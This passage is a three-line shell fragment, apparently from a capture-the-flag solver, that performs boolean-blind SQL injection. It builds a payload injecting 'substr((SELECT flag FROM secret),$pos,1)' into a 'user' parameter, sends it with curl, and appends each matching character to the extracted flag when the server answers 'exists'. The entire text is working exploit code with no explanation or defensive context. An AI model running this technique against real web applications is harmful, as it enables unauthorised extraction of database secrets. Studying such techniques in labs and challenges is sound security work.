        inj="admin' AND substr((SELECT flag FROM secret),$pos,1)='$c' -- "
        r=$(curl -s -G "$base" --data-urlencode "user=$inj")
        [ "$r" = exists ] && { flag="$flag$c"; found=1; break; }
